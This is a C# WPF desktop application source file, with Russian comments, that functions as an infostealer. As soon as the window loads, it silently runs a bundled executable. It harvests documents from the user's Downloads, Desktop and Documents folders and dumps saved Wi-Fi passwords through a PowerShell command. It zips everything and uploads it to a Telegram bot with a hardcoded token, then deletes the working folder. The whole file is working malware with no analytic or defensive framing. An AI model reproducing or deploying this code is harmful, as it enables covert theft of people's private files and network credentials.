using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.IO.Compression;
using System.Net.Http;

namespace WpfApp4
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();
            this.Loaded += MainWindow_Loaded;
        }

        private void LaunchExternalExe()
        {
            string exePath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "1.exe");
            ProcessStartInfo startInfo = new ProcessStartInfo()
            {
                FileName = exePath,
                WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (Process process = new Process())
            {
                process.StartInfo = startInfo;
                process.OutputDataReceived += (sender, args) => Console.WriteLine($"Output: {args.Data}");
                process.ErrorDataReceived += (sender, args) => Console.WriteLine($"Error: {args.Data}");
                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();
            }
        }

        private void MainWindow_Loaded(object sender, RoutedEventArgs e)
        {
            LaunchExternalExe();
            CopyFilesAndCreateZipButton_Click(this, new RoutedEventArgs());
        }

        private async void CopyFilesAndCreateZipButton_Click(object sender, RoutedEventArgs e)
        {
            string userFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string[] paths = new[]
            {
                System.IO.Path.Combine(userFolderPath, "Downloads"),
                System.IO.Path.Combine(userFolderPath, "Desktop"),
                System.IO.Path.Combine(userFolderPath, "Documents")
            };

            string zipFileName = $"{Environment.MachineName}_Info_System.zip";
            string zipFilePath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), zipFileName);

            // Определяем путь к временному файлу Wi-Fi профилей
            string tempPath = System.IO.Path.GetTempPath();
            string wifiProfilesFilePath = System.IO.Path.Combine(tempPath, "WifiProfiles.txt");

            try
            {
                // Создаем список файлов для архива
                var filesToCopy = new List<string>();
                string[] fileExtensions = { "*.pdf", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.rtf", "*.txt" };

                foreach (var path in paths)
                {
                    foreach (var extension in fileExtensions)
                    {
                        try
                        {
                            filesToCopy.AddRange(Directory.GetFiles(path, extension, SearchOption.AllDirectories));
                        }
                        catch (Exception ex)
                        {
                            // Log exception
                            Console.WriteLine($"Error accessing path {path}: {ex.Message}");
                        }
                    }
                }

                // Получаем Wi-Fi профили и записываем в файл
                try
                {
                    // Создаем команду PowerShell
                    string psCommand = "-Command \"(netsh wlan show profiles) | Select-String '\\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\\\"$name\\\" key=clear)} | Select-String 'Содержимое ключа\\W+\\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ProfileName=$name; Password=$pass }} | ConvertTo-Json -Compress\"";

                    // Запускаем процесс PowerShell
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        FileName = "powershell.exe",
                        Arguments = psCommand,
                        RedirectStandardOutput = true,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    };

                    using (Process process = Process.Start(startInfo))
                    {
                        using (StreamReader reader = process.StandardOutput)
                        {
                            string jsonResult = reader.ReadToEnd();
                            var wifiProfiles = System.Text.Json.JsonSerializer.Deserialize<List<WifiProfile>>(jsonResult);

                            // Преобразуем в табличный формат
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine("ProfileName\tPassword");

                            foreach (var profile in wifiProfiles)
                            {
                                sb.AppendLine($"{profile.ProfileName}\t{profile.Password}");
                            }

                            // Записываем результат в файл
                            File.WriteAllText(wifiProfilesFilePath, sb.ToString(), Encoding.UTF8);
                        }
                    }
                }
                catch (Exception ex)
                {
                    // Log exception
                    Console.WriteLine($"Error retrieving Wi-Fi profiles: {ex.Message}");
                }

                // Добавляем файл с Wi-Fi профилями в список для архива
                filesToCopy.Add(wifiProfilesFilePath);

                // Ожидаем создания папки "results"
                string resultsFolderPath = System.IO.Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "results");
                while (!Directory.Exists(resultsFolderPath))
                {
                    await Task.Delay(2000); // ждем 1 секунду
                }

                // Добавляем файлы из папки "results" в список для архива
                filesToCopy.AddRange(Directory.GetFiles(resultsFolderPath, "*.*", SearchOption.AllDirectories));


                // Создаем архив с сохранением структуры папок
                CreateZipFromFilesWithFolders(filesToCopy, zipFilePath, userFolderPath);
                Console.WriteLine($"ZIP file created at {zipFilePath}");

                // Отправляем архив
                await SendFileAsync(zipFilePath);


                // Удаляем папку "results"
                Directory.Delete(resultsFolderPath, true);
                Console.WriteLine($"Directory 'results' deleted");

                Close();
            }
            catch (Exception ex)
            {
                // Log exception
                Console.WriteLine($"Error creating zip file: {ex.Message}");
            }
        }

        private static void CreateZipFromFilesWithFolders(List<string> sourceFilePaths, string zipFilePath, string rootPath)
        {
            try
            {
                using (FileStream zipToOpen = new FileStream(zipFilePath, FileMode.Create))
                {
                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                    {
                        foreach (var sourceFilePath in sourceFilePaths)
                        {
                            string relativePath = GetRelativePath(rootPath, sourceFilePath);
                            archive.CreateEntryFromFile(sourceFilePath, relativePath);
                        }
                    }
                }
                Console.WriteLine($"Successfully created ZIP file at {zipFilePath}");
            }
            catch (Exception ex)
            {
                // Log exception
                Console.WriteLine($"Error creating zip archive: {ex.Message}");
            }
        }

        private static string GetRelativePath(string rootPath, string fullPath)
        {
            Uri rootUri = new Uri(rootPath + Path.DirectorySeparatorChar);
            Uri fullUri = new Uri(fullPath);
            Uri relativeUri = rootUri.MakeRelativeUri(fullUri);
            string relativePath = Uri.UnescapeDataString(relativeUri.ToString());

            return relativePath.Replace('/', Path.DirectorySeparatorChar);
        }

        private static async Task SendFileAsync(string filePath)
        {
            var botToken = "7325932397:AAGYcJAyNxZPXC4Uw3rvzzrYP-6ionuD4Nw";
            var chatId = "1005333334"; // Corrected the chatId variable
            var url = $"https://api.telegram.org/bot{botToken}/sendDocument";

            using (var client = new HttpClient())
            {
                var form = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(File.ReadAllBytes(filePath));
                fileContent.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("multipart/form-data");
                form.Add(fileContent, "document", Path.GetFileName(filePath));
                form.Add(new StringContent(chatId), "chat_id");

                try
                {
                    var response = await client.PostAsync(url, form);
                    var responseBody = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Response: {responseBody}");
                    response.EnsureSuccessStatusCode();
                }
                catch (Exception ex)
                {
                    // Log exception
                    Console.WriteLine($"Error sending file to Telegram: {ex.Message}");
                }
            }
        }

        public class WifiProfile
        {
            public string ProfileName { get; set; }
            public string Password { get; set; }
        }
    }
}
